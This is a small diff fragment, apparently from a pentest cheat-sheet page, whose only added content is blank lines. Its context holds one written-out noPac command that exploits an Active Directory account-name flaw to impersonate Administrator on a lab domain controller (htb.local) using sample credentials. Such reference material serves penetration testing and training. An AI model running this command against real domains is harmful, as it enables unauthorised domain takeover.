@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:11.698743+00:00'
 ```bash
 noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
 ```
+
+
